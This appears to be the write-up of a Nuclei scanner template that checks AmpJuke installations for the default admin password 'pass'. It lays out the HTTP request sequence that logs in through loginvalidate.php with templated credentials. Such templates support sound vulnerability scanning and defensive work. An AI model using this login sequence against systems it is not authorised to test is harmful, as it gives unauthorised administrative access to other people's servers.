# Nuclei Template: AmpJuke - Default Login
**Template ID:** ampjuke-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ampjuke-default-login.yaml`)

## Vulnerability Information & PoC

## Description
AmpJuke contains a default login vulnerability. Default admin login password 'pass' was found.

## Steps to reproduce / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /loginvalidate.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

uuid={{url_encode(token)}}&login={{username}}&password={{password}}&Submit=Submit

GET /index.php?what=welcome HTTP/1.1
Host: {{Hostname}}
```

